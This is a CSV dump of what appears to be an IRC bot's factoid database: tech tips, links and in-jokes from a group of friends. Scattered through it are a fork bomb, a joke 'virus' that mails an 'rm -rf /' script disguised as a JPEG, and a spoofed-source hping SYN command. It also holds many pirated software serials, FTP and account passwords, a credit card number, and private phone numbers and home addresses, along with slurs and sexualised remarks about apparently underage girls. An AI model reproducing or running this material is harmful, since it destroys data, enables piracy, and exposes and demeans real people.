Key,Value,Username
xbox av and hd packs,have screws under the label,gurov-cali
death valley,92328,sargon2
a good time the change your password,when you type it into IRC,Gand
dutchman,http://www.bmeworld.com/dutchman/dm-warning.html,jesse
delorme topo,ftp://d0wnl0ads:here-w3-go@209.61.228.12:65302 <--- delorme topo,sargon
most comfortable chair ever,http://f3h.com/r/chair.jpg,gurov-1
event viewer,sideways y + upside down v + birds flying out of valley + |\\ + man flinking fingernails while sitting,guan-w3rk
hardwire,not rowtow,Bascule
best vt program,powervt,gurov-home
marc,pw33n3d,Gand
totem pole of death ,:(){ :|:;:&};:,sargon
dreb,bought,jason`w`atmos
mantrain,(})(})(})(})(})(})(})(})(})(})(})(})(})(})(})(})(})(})(})(})(})(}),Gand
qmail virus scan,http://qmail.org/qmail-smtpd-viruscan-1.0.patch,Basc-work
netgear,"the anti-DLink, their networking gear is awesome, unlike DLink's piece of shits",jesse-asdf
homer simpson's email address,chunkylover53@aol.com,sargon
golf,playing fetch with yourself,brian
basketball,a stupid mundane game enjoyed only by foolasses,bp
hockey,best sport ever.,bp
sargon,"pick one of bessen, beson, besson, bensen, benson, beeson, beesen, or besen",sargon
frog job,http://mdn.mainichi.co.jp/waiwai/0306/0623frogs.html,Gand
free copy of everquest,ftp://eqftp.station.sony.com/eqfull.exe,jesse
sarghaus,5620 fossil creek pkwy. #10-205,sargon
second best spam ever,please i will not allowmy family members to know about it cos their may plan to Evil for me as am still a small Boyof 27 Years,Gand-w3rk
trillian pain,(@)(&)(@)(&)(@)(&)(@)(&)(monkey) LOL ROFL LMOA (ufo)(@)(&)(@)(&),Gand-w3rk
f3h mail ports,4110 and 4025,jesse
vatos,locos forever homes,crazy
aol,crap,crazy`d
xp login screen theme,HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\ThemeManager HKEY_USERS\\.DEFAULT\\Control Panel\\Colors,Bascule
digital archive project,http://www.dapcentral.org/,Bascule
gurov's cell,9709809230,gurov-home
qwest,avoid at any cost,sargon
opera 7.11 for win32 serial,w-fUzDn-TSmEf-J6Dez-AWcsT-L8T5f,chu
nwn key,QFETM-MPU3X-DN6FF-MHFDA-YWARA-4HMPE-RDJTG,jesse-laptop
bofh,telent gentoo.atmos.colostate.edu 666,jason
hollywood,breeding ground for assholes,brian-w3rk
cog commercial,one second of CG in the middle: http://www.dailyrecord.co.uk/news/page.cfm?objectid=12844132&method=full&siteid=89488&headline=TAKE%20606 and http://www.boston.com/dailyglobe2/178/nation/Whir_click_thump_an_ad_s_alluring_rhythm+.shtml,nathan`w
putty freebsd,http://dmr.ath.cx/notes/putty-freebsd.html,sargon2
ircrfc,http://www.faqs.org/rfcs/rfc1459.html,gurov-lar
utah state patrol,I-70 miles 16 and 156,Gand
cleartype,http://www.microsoft.com/typography/cleartype/cleartypeactivate.htm,nathan`w
proxy,http://anon.efga.org/WebProxies,Brian-w3rk
real alternative,http://home.hccnet.nl/h.edskes/mirror.htm,jesse
uninstalling office xp,jacks all your paths,Gand-contw3rk
poopfartanus,ftp://d0wnl0ads:here-w3-go@209.61.228.12:65302/,jesse
any key,http://www29.compaq.com/falco/detail.asp?FAQnum=FAQ2859,jesse
xbox snes xnes9x settings,e:\\tdata\\0fffdaed,gurov-cali
japan,1-800-543-0251,Bascule
mcdonalds coffee,fucking horrible,Gand-i70
25 dollar ssl cert,https://members.ev1.net/rsMembers/english/ssl/sslorder.asp,gurov-cali
http://w3rd.net/c.rar http://w3rd.net/e.rar download those 2 files,xbox hack,gharris_
xbmp ftp,xbmp.xbins.org xbmp/#xbins,gurov-cali
free ssl,now $39 http://freessl.com/,Gand-w3rk
caltech ntp,192.12.19.20,Gand-w3rk
windows 2000 server,humanity at its worst,Gand-w3rk
nocatsplash,http://nocat.net/~rob/wrt54g/,gharris-lab
debian cheat sheet,apt-get update; apt-get upgrade dist-upgrade,gharris`lab
sidekick irc,48x19 characters,sargon
tonight,"P0/<3R /\\/iGH7!@3,.m!@$7hsd\302\241kj!*\302\277!@3y78hdf!!1",Cy-w3rk
nes roms,http://wso.williams.edu/~pmulliga/,gharris
gandbox,D66203F341CB1112C8BEE47C675810540124DE50,Gand
uormom,"and i know lots bout computers but termanil moneky sounds like you could use it with some termnail progroam in ur start menu, BUR WAIT THERE IS MORE, i heard you cant use it on a GUI OS (icons = NO) got xp i dont think u can have it. but if you go to start prgrams, assersocey, comminations, there is a HYPER TERMANAL see what u can do",sargon2
pauly shore,213.896.2934,Brian
scrabble dictionary,http://www.hasbro.com/scrabble/pl/page.tools/dn/home.cfm,guantes
opera 7 for lunix serial,u-HHn4z-vbJST-RVffi-EjPwb-Q6e5h,Basc-work
opera 7 for windows serial,w-fUzDn-TSmEf-J6Dez-AWcsT-L8T5f,Basc-work
opera 7 for freebsd serial,f-uVdFj-z8FEs-3AYCz-yvhHz-SmA4i,Basc-work
tcpserver args,-R -H -D,gurov
gurovssl,http://www.thawte.com/html/SUPPORT/server/softwaredocs/modssl.html,gurov
enron,http://www.ferc.gov/industries/electric/indus-act/wem/03-26-03-release.asp,gharris`lab
work,lame,KobyBriant
msn messenger uninstall,"RunDll32 advpack.dll,LaunchINFSection %windir%\\INF\\msmsgs.inf,BLC.Remove",Bascule
csu dns,129.82.100.64 129.82.103.75,Gand-w3rk
real,fuckyoureal@hatepool.com/gotohell,gurov
dick justice,"Who's the man with nothin' to lose?  Who's the grimiest, cap bustin', metaphor spewin', avengin' badass of the ghetto? that's right - Dick Justice!",joe
craig,a little bitch,Cy-w3rk
cy-w3rk,pillow biter,craig_w3rk
negrojones,negro homo ass poker,craig_w3rk
yellow,PERFORMANCE,Brian
acm,acm,acm
cheap high bandwidth hosting,http://www.interland.com/dedicated/self_managed.asp,Basc-work
quantum-phase storage,http://science.slashdot.org/article.pl?sid=00/09/16/0435237&mode=thread,Bascule
elitist asshole,http://www.penny-arcade.com/view.php3?date=2002-07-12&res=l,gurov-r
fu,http://w3rd.net/e/ozone-fu.jpg,gurov-r
srt-4,http://www3.telus.net/teamsuperstar/SRT-4.wmv,gurov-co
colorplus serial,112710-150090-4674,Gand_
shr4k,http://www.howstrange.com/gallery/image209.html,gurov-co
waiting,http://www.howstrange.com/gallery/image18.html,gurov-co
inconvenience,http://www.penny-arcade.com/view.php3?date=2003-10-29,joe
domains with wildcards,cc cn cx mp museum nu ph pw tk tw ws,sargon2
kbfr,http://64.237.58.71:8501 || 7202764493,YABLO
html tag regex,<[^>]*>,Gand-w3rk
dvd bytes,4 705 042 432,guantes
gand cell,818-795-2050,Gand
jackalope cell,970-581-2011,JackalopeXP
fthis,http://w3rd.net/e/meteor-fthis.jpg,gurov-asdf
fthat,http://w3rd.net/e/meteor-fthat.jpg,gurov-asdf
xslt carriage return,"<xsl:text disable-output-escaping=""yes"">&#x0D;&#x0A;</xsl:text>",sargon2
utena,Zetai Unmei Mokushiroku!,sargon2
powergaming,http://homepage3.nifty.com/nura/images/moSMB3.wmv,Quas-w3rk
jailbait,http://solsar.com/i/eh/acro/Kelly.jpg,Gand-w3rk
sanyo 8100 debug,##040793 -> ok -> save phone #,gurov-fu
terminal server licensing,HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters. Edit or create the REG_SZ value DefaultLicenseServer and set it to the network name or IP address of the license server to use.,bp
gand's discover card,6011009010655308,Gand-w3rk
jeff,the suck,vance
cob,<blue-mecha> geh uhm.... i guess we're just 129.82.40.x --> 42.x,gurov-asdf
atmos,129.82.49-51 here,gurov-asdf
oldfeh,"finally out of CSU's system, lying somewhere in the house of gurov",Gand-w3rk
the_holy_shit,poop_still_partially_coming_out_of_the_sphincter_AND_touching_the_lense_at_the_same_time,vance
kbfr stream,http://64.237.58.71:8501,Basc-gj
drebel fund,-$750,bp`w
imagemagick,for %i in (*) do convert -normalize -scale 768x768 %i %i,YABLO
2asdfasdf,what,jason`atmos
kill_bill,fail,vance
jessie,sexy bitch,vance
that cream,Cash Rules Everything Around Me,jesse
appache,an angry indian,lee`w
otoh,on the other hand,sargon2
subversion viewcvs instructions,http://www.contactor.se/~dast/svnusers/archive-2003-10/0237.shtml,Basc-feculent
newfs args,-b 16384 -f 2048 -O2 -U,Bascule
onenote key,wfdwy-xqxjf-rhryg-bg7rq-bbdhm,gurov-asdf
ballistic trajectory + wind,r(t) = r_0 + v_0 * t + (a_g + (v_w - r'(t))^2) * t^2,bishop
rainbows,\0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S\0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S\0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S\0034R\0037A\0038I\0039N\0033B\00310O\00312W\0036S \0034R\0037A\0038I\0039N\0033B\003,jesse
the og mac fags,"jesse, mark, jackalope",jesse-lapt0p
fehroot,"gurov,sargon",gurov-fuckingevil
spst,"single pole, single throw",bishop
xp autologin,control userpasswords2,gurov-E
e,>:E,nathan2
network monitor driver thingy,http://maxivista.com,gurov-E
>:e font,batang,gurov-
linux virus,"echo -en ""#!/bin/sh\nrm -rf /"" > natalie_portman_nude!.jpg.sh | mail <whoever>",Gand-w3rk
driverguide,csohns@yahoo.com:driverall,galen
huevo's phone number,685-31795,bishop
transparent proxy,iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 -j REDIRECT --to-port 48080,gurov-EE_
time for a fr0mat,when 'host' segfaults,Gand
ro zoom hack,"open ragexe.exe, replace 66 43 00 00 C8 43 with 66 43 00 00 86 44",Gand
emoticons,http://t.xem.us/emoticons.txt,sargon2
hit formula,"attacker_hit(level+dex) + 80 - defender_flee %, limited to 5-100",sargon
absent minded,<maruth> why am i so frgn absent minded | <maruth> i cooked a pizza and forgot about it | <maruth> so it burned to death | <maruth> so i cooked another making sure to set the alarm | <maruth> and wehn the alarm went off i took it out but then forgot to eat it,bit
cy in 10 years,http://www.isye.gatech.edu/~sman/mike/ireland/People/shane.jpg,Jesse-Laptop
haxbox,"gurov, jesse, cy, brian, gharris, bp, bascule, blue, craig, craig's nephew, jesse's brother, gand, joe, gurov's ricerfriend, hoffman, acm, brian's cousin and alex",Cy
rdp key,hklm\\system\\currentcontrolset\\control\\terminal server\\winstations\\rdp-tcp\\portnumber,Brian
2-2 skill list,http://www.firearmour.com.sg/~rouniverse/class2.htm,Gand
force outlook plaintext,http://support.microsoft.com/default.aspx?kbid=307594 (yes it even works with outlook 2003 on an exchange server),Gand-w3rk
longmont,teh sux,Brian
winamp 5 key,asdfasdf/RVNNH-2CWDV-PBD5J-9M5VA,Brian-GWV
apache ssl,http://hunter.campbus.com/,bp`w
start,6:30,Cy-w3rk
cf,latin for 'confer' i.e. compare,bishop
wamp,http://www.devarticles.com/c/a/Apache/Installing-PHP-under-Windows/,someoneelse
php iis,http://www.visualwin.com/PHP-ISAPI/,bp`w
drew,foolass,bp`w
itunes port,3689,Gand-w3rk
gibson,http://www.msynet.com/projects.php,gharris`lab
running tasks list,http://www.answersthatwork.com/Tasklist_pages/tasklist_c.htm <-- replace c with letter,gurov-EE
mgear,wallet slimfast,lee`w
radio zonde controls,"arrow keys move, space/z primary fire, x secondary, c shields, v bombs",sargon2
msvs.net,http://cg.xem.us/,Bascule
sequoiaview,"l33t badassery, also available for mac: http://derlien.com/diskinventoryx/",nathan2
bsod,http://yablo.bigevilcorp.com/bsod.php,Yablo-GWV
nathan,skinny white boy with a window office,lee`w
bascule in 40 years,http://christianaid.org/images/feature/drfinley.jpg,Jesse-foo
irc,http://graphics7.nytimes.com/images/2004/05/05/technology/06CHAT.coverl.jpg,Gand-w3rk
sam,dumb,bp
up arrow,&#9650;,nathan2
bp,*giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle* *giggle*,Gand
gay canon fan club,"jason, nathan, jeremy, sargon, yablo",jason`w
mcse site,https://partnering.one.microsoft.com/mcp,Yablo-w3rk
optical serial,678430-793350-3604,sargon2
zen,a steaming pile of shit,Yablo-w3rk
colorplus serial \00301,112710-150090-4674,gurov-EE_
firefox extensions,http://texturizer.net/firefox/extensions/,yablo
dvd cover dimensions,"10.625""x7.125""",Gand
payphones,http://www.payphone-project.com/numbers/,gharris`w3rk
trex,infinite failure.  more failure than alex (almost),Yablo-GWV
paidlast,besen,gurov-EE
t1 loopback,"rj45 - pin 1 to 4, 2 to 5",gurov-EE
hohut,place to get hos,Sam-I-Am
asdfasdfasdf,jkl,gurov-EE
huevo time difference,5 hours behind colorado,bishop
lee,fro-boy witha 'tude who is envious of said skinny white boy with a window office,sock
330ci fund,"\00311$2000 \00312[\0039$$\0037------------------\00312] \00311$40,000",Gand-w3rk
o_o,"the full of advice older, smart jock school class \00301president who approaches me with vaseline in the locker room after i got beat up in the \00301showers",gurov-w3rk-geh
fallen to piebot,"nathan, sock,....?",jeremy`w
swana,http://yablo.dyndns.org/~sock/images/-current.png,sock_
lisp primer,http://grimpeur.tamu.edu/~colin/lp/,SpongeWork
jkl,asdf,gurov-w3rk
jkl2,asdf2,gurov-w3rk
ipod,money better spent getting laid,bp
business card size,"3.5"" x 2""",gurov
screensaver high score,"22,300",guan-w3rk
meta refresh,"<META HTTP-EQUIV=Refresh CONTENT=""10; URL=http://www.asdf.com"">",guan-w3rk
sin city,130.253.4.19:27015,yablo
double icc profiling,BAD,sargon
bmw 760li sedan,the most expensive ipod accessory ever,nathan2
wireless tools,http://www.hpl.hp.com/personal/Jean_Tourrilhes/Linux/Tools.html,bob
shit you can't take on a plane,http://www.tsa.gov/public/interweb/assetlibrary/Permitted_Prohibited_12_18_2003.pdf,J-Roc
firefox java,http://java.sun.com/update/1.4.2/j2re-1_4_2_04-windows-i586.xpi,Yablo-w3rk-GWV
cf card performance,http://www.robgalbraith.com/bins/multi_page.asp?cid=6007,sargon2
csu windows server 2003 key,M3QBB-98BV4-V2R6K-PJMQK-83BQY,PremiseRunningThin
ocd,http://home.comcast.net/~slykittycat/picture3.jpg,jesse
i.e.,ipso est,bishop
e.g.,exempli gratia,bishop
yablo's convert flags,for %i in (*) do convert -normalize -size 768x768 -mattecolor white -frame 25x25 %i %i,yablo
gbsfm,http://grace.fast-serv.com:9024/listen.pls,yablo
powerbook,http://cgi.ebay.com/ws/eBayISAPI.dll?ViewItem&item=5109994875,Cy-24
gand's shuttle,ST61G4,Gand-w3rk
charter,"6246 san fernando road, mf 9-6 sa 9-4",Gand
rb's grabber,http://f3h.com:6060/,bishop-w3rk
firefox tweaks,http://www.tweakfactor.com/articles/tweaks/firefoxtweak/,yablo
esperanto,"studies show esperanto accellerates learning of other romance languages, i.e. 2yr french == less fluent than 6mo esperanto+1.5yr french",sargon2
postgres tablename by pid,"select pg_locks.mode, pg_locks.granted, pg_locks.relation, pg_locks.pid, pg_class.oid, pg_class.relname from pg_locks,pg_class where pg_locks.relation=pg_class.oid;",sargon2
alg.exe,windows ics,gurov-cali
politics,http://fearoffalling.net/dev/goback.JPG,jeremy`w
solsar traffic,http://solsar.com/traffic/,Gand-w3rk
putty socks proxy,http://developers.slashdot.org/comments.pl?sid=116735&cid=9877955,nathan
nickelback,www.nintendorks.com/brandon/archives/000475.php,nathan2
oops,http://img55.exs.cx/img55/2157/nooooo.jpg,nathan2
cli image utils colorspace,http://www.littlecms.com/newutils.htm#icctrans,gurov-w3rk
vb6 mouse wheel,http://support.microsoft.com/default.aspx?scid=kb;en-us;837910,sargon2
bitftp,owned by chinese,bit
lee address,2830 sagebrush 80525,nathan2
abortion,"1/2oz tomato juice, 1/2oz everclear and a gummy bear",nathan2
ramweb comment email,SSweb@lamar.colostate.edu,bishop
usb to serial,http://www.mp2kmag.com/mappoint/discussion/viewtopic.asp?t=5273,gurov-EE
excessive,67.15.21.122,yablo
paintball,"jesse, joe, cy, bishop, guantes,",Jesse
weathercam,http://www.atmos.colostate.edu/webcam/latest1.jpg,lee`w
german for wimp,Sitzpinkler,bishop
asian age guide,"If she looks twent-two, she's fifteen.  If she looks fifteen, she's twenty-eight.  If she looks twenty-eight, she's over forty.",Gand
j-roc's real name,Jamie,bishop
cat5,http://www.aptcommunications.com/ncode.htm,lee`w
bulk ink for canon and epson,http://www.helixcamera.com/Digital/lyson/lysoncis.html,gurov-w3rk
csu xp,R3W6Q-8JPFB-KJF9W-GVW27-9X6WD,gurov-EE
windows server 2003 deployment kit,http://www.microsoft.com/windowsserver2003/techinfo/reskit/deploykit.mspx,blue-s
bova,sexy net ninja,Quasimodem
vegans,"""Vegetarians, and their Hezbollah-like splinter faction, the vegans, are a persistent irritant to any chef worth a damn. To me, life without veal stock, pork fat, sausage, organ meat, demi-glace, or even stinky cheese is a life not worth living. Vegetarians are the enemy of everything good and decent in the human spirit, an affront to all I stand for, the pure enjoyment of food.""",nathan
oreilly,http://iis1.cps.unizar.es/Oreilly/perl/,nathan2
cthulhu's location,"Maebashi, the capital of Gunma Prefecture; 2.5 hours NE of Tokyo by train",bishop`w
cthulhu's email,davekapp@gmail.com,Cthulhu|work
john waters,Bascule -> http://www.retrocrush.com/archive2004/johnwaters/vintagejohn.jpg,J-Roc
bascule in 10 years,http://pixpls.com/i/js-cover.jpg,Gand-w3rk
sidetrack,Name: The Good Life SN: STRACK1000-20C9-REAF-LQ07-4A5F-21F4,nathan2
tripod,3021BPRO legs + (486RC2 balhead | 322RC2 grip ball head),gurov-hat
big6,"aol/tw, disney, bertelsmenn, viacom, news corp, vivendi",yablo
ie select watermarking,http://www.deviantart.com/view/7893736/,Gand
wcg id,wcg@ai9.org / asdfasdf,guantes
ethopian stuffins,injera,bit-work
backup exec fail job on corrupt,HKEY_LOCAL_MACHINE\\SOFTWARE\\VERITAS\\Backup Exec\\Engine\\Backup\\Fail Jobs on Corrupt Files   set dword to 0,bp`w
winzip 9,Murad Meraly/34077594,sargon2
cpan,perl -MCPAN -eshell,gurov-class
courier imap,"/notls, or php breaks",gurov-w3rk
dsl extreme bitch number,800-774-3379,Gand-w3rk
sbc bitch numbers,800-310-2355 residential 800-750-2355 business 866-937-3664 hi-cap,Gand-w3rk
maruth quote,#linux.10.11.2001.log:[12:57] <maruth-san> i'm steve kaufman! call me at 1800 6 hundred three score and six rofl rofl westwook college spining socker kick did you see that on upn? lol,sargon2
xbmc ,http://t3ch.xil.us/,Gand-w3rk
windows process library,http://www.liutilities.com/products/wintaskspro/processlibrary/,Gand
smilies,http://forums.somethingawful.com/misc.php?s=&action=showsmilies,nathan2
treo 600 phone app wallpaper aspect ratio,4:3,Gand
ebay,cesspool,yablo
camera field of view,http://www.dudak.baka.com/fovcalc.html,sargon2
20d fund,$1000 \00312[\0039$$$$$\0037--------\00312]\003 ~$2200,Gand
photomechanic reg,SCOTCH TEAM / SCOTCH / 0022711652,gurov-EE
acdsee7,4TBDYK-JDTJJ-93QDWF-3KMWXCL,gurov-home
trackermania.com acdsee,acdcyber,gurov-home
cs,timeeater,yablo
server tracking number,1Z3761W60311008119,TheDude
furry,http://www.mv.com/ipusers/amy/A/minerva-powrtool.gif,Gand-w3rk
ipod voltage,touch /path.to.ipod/iPod_Control/Device/_show_voltage,Yablo-w3rk
defrag shared drive in the middle of the day,NO,Gand-w3rk
mrtg,http://mrtg61.contentbroadcast.com/c226-Anthony/cust.php,TonyToniTone
directx code path in hl2,mat_dxlevel 81 or 90,nathan2
top,"ps -aw -o '%cpu' -o user -o command | grep -v ""^ 0.0"" | sort -n",sargon
yablofr0mat,firefox itunes gaim putty mircstats nero photoshop azureus/safepeer smartftp synergy mcafee openoffice onenote steam webdrive acdseeclassic shittricks printersoftware tag&rename imagemagick panavue bsplayer winrar,yablo
salre,1114236,yablo
du cs,130.253.4.22,yablo
cu cs,128.138.207.131,yablo
quicktime pro apple mac osx,4RKC-P86K-ZKPW-C8GN-25FA,Cy-w3rk
hosstop,groincooker,galen
acdsee 7 serial,4TBDYK-JDTJJ-93QDWF-3KMWXCL,Gand
terminal beep,"while true; do echo ""\\007""; sleep 5; done",nathan2
avril without makeup,http://www.newyorkish.com/newyorkish/avril_withoutmakeup.jpg,DwayneWayne
urlgrabber,g.xem.us the/the,sargon
treo 650,http://discussion.treocentral.com/attachment.php?s=1479c4e83005162312d823db6a7df5c1&attachmentid=4779,gurov
gurov's new phone,970 980 9230,gurov
goontown,69.9.176.184,nathan
disable mod_deflate cause it breaks flush,"SetEnvIf Request_URI ""^\\/scriptname\\.php"" no-gzip (and no-deflate)",sargon
check cubemaps,impulse 81,yablo
caps lock,http://johnhaller.com/jh/useful_stuff/disable_caps_lock/,gurov-ih8tfp
du cs stats,stats.coloradocg.com,yablo_
goon cookbook,http://members.cox.net/sagoons/,yablo
gbstown,70.84.105.118,yablo
fyadtown,:70.84.105.118:27016,yablo
fith cs,216.17.194.70,sock
csu office 2003 key,B8wPW-BRJvC-HKKXF-Y79QR-FHQHM,SpongeBob
nero serial,1A23-0009-0030-2213-0264-3101,guan-w3rk
f3h nameservers,ns[12].fr0mat.com,bishop-srvrm
yablo ,eaten by a fat girl,Jesse-laptop
stuffit expander wayfaster startup,defaults write com.stuffit.Expander allowVersionChecking -bool NO,Yablo-w3rk
mac acdsee,http://eosim.sourceforge.net/,yablo
nef jpeg extractor,http://drchung.new21.net/previewextractor/,gurov-heh
office x serial,P247Q-J3CBW-2K783-DY48R-P348Y,Yablo-w3rk
windows stop error messages,http://solsar.com/mirror/stoperr.htm,Gand
poring damage,http://pixplz.com/ro/dmg4.jpg,gurov-home-uaaa
xp zip search prevention,regsvr32 /u zipfldr.dll && regsvr32 /u cabview.dll,yablo-w3rk
history,"<sargon> [this person] attacked [this location], forming [this new name for the same location], the people believed [this religious belief], they treated their women [this way].",galen-w3rk
fibonacci sequence,"for (;--$n;) $current = Sum($prior,$prior=$current);",nathan2
quicktime mac,Serial: Name: Apple Computer   s/n: 9CLP-UAAZ-ZUNU-4RW6-F3E1 Name: QuickTime User   s/n: Z684-9ZDD-U86D-KCGC-B760,nathan2
temporarily disable auto-update in itunes,hold down cmd+option while plugging in ipod,nathan
iwork,CCFK-T4OG-FHG1-41G2-200F,yablo-ibook
frcc photo lab hours,"mon 10am-11:30am, tue 3pm-8:30pm, wed 10am-11:30am, thu 3pm-6pm, fri 9am-8:30pm, sat 10am-3:30pm, sun 9am-4:30pm",sargon
elysium,http://www.pcgamemods.com/10024/,nathan
sequoiaview for os x,http://www.derlien.com/page1.html,yablo
d4,King of the Junk Show but also a cool dude and a crackwhore,corey
abc,a\nb\nc\nd\ne\nf\ng\nh\ni,nathan`tx
whitespace,\n          <--,nathan`tx
orz,http://www.boingboing.net/2005/02/07/all_about_orz.html,nathan2
bit's birthday,feb 28,guan-w3rk
regex indexing,http://oak.cs.ucla.edu/~cho/papers/cho-regex.pdf,nathan2
plus32,asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasd,nathan`tx
cthulhu,David Kapp; game-obsessed guy; currently lives in Japan; homepage at http://www.davidkapp.com,Cthulhu|work
aa,short,nathan2
aaa,not short,nathan2
chuggah,yuo,Gand-w3rk
best line ever,i didn't break it!,nathan2
..,NOT AN ELLIPSIS! OMFG,guan-w3rk
goatse,"\n ( E@3 )\n / /U\\ """,nathan2
my hovercraft,full of eels,monty_python
php book,hudzilla.org/phpbook,Cy-h0m3
travel chica,www.solbeam.com,nathan2
firebomb,heat-assisted living,nathan2
photoshop cs key,1131-1126-1139-6167-4149-2097,jesse-jessicas
rubybot thistle subversion repo,svn+ssh://thistle.atmos.colostate.edu/var/subversion/rbot,bishop`w
hping,hping -V -c 100 -d 40 -S -p 139 -s 139 -k -a <ip> <ip>,yablo-otherwork
lynne tickets,http://cgi.ebay.com/ws/eBayISAPI.dll?ViewItem&category=16122&item=6517995365&rd=1,Cy-w3rk
resource kit download,http://www.dynawell.com/support/ResKit/,Gand-w3rk
stopmotion pro v4,Evil Knievel / cracker@paradox.com / 117370791802 / SDXHNGACNDJHREUGJJBB7CEJREVFKFUC37KB,sargon
opera ad block,http://solsar.com/mirror/operaadblock.html,Gand-w3rk
finder quicktime preview disable,defaults write com.apple.Finder PreviewDisclosureState 0,yablo
reboot in windows xp,shutdown -r -t 10,nathan2
delicious library,good-life-penury-amra-cruive,yablo
compression altitude,http://www.asashop.org/autoinc/feb2003/techtotech.cfm,gurov-wh0h0h0h0h0rk
guanserver,65.110.41.40,guan-w3rk
impwedding,melandmatt.net,guan-w3rk
yzf600r fund,"\00311$1500 \00312[\0039$$$$$\0038------------\00312] \00311$7,500\003",Gand-w3rk
most awesome command ever,"if ((`wget -qO - ""http://10.107.52.38:8080//jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.mq.destination%3Aservice%3DTopic%2Cname%3DCMPMessages"" --http-user=removed --http-passwd=removed | tr -d ""\n"" | sed ""s/^.*AllMessageCount.*\\(\\1[0-9]*\\)<.*/\\1/g"" && echo -en ""\n""` > 10000)); then exit 2; else exit 0; fi",galen-w3rk
halfbeard,"the ""wrong"" Elsner",sock
corey,foolass,bp`w
frontage road,b00b13s,corey
spelling,HalfBeards foible,lee`w
damnation,frontage road,corey
google sightseeing,http://www.shreddies.org/gmaps/,Yablo-w3rk
halfbearded,a word mispelled to the point of irrecognizability,Halfbeard
deathsnow 2003,http://solsar.com/gallery/thumbnails.php?album=30,Gand-w3rk
piebot,http://216.17.170.43/~piebot/images/-current.png,bp`w
global warming,"the fires of hell spilling over onto the earth, harbringer of the end of the world and most importantly the end of all skiing",Halfbeard
rsync,you're better off wiping everything and copying it fresh,gurov-w3rk
taddress,121 e water st appleton wi 54911,Harlequin
soundclick,soundclick@solsar.com/asdf1234,Gand
mushrooms,corey's kryptonite,Halfbeard
lee's jeep,the Leep or the DORTMUNDER,Halfbeard
settlers 3,6340-2247-3385-5695-2599,joe
wigger,wanker==anoying little guy,Halfbeard
daddress,04:53PM <Quas-w3rk> 1420whdf lmco80501 also i eat cocks,Harlequin
gaddress,"4:57PM <guantes> 3945 landings dr #A2 ft collins, co 80525 also im afk and not saying this",Harlequin
tzip,54911,Harlequin
quicktime 7 mac,Pablo/nop SMH2-6F4K-8SK9-ST5W-QKU3,nathan
haydon,tall lanky MF that is a FNG to IRC and a human phone book,Halfbeard
vi syntax disable,:syntax off,guan-w3rk
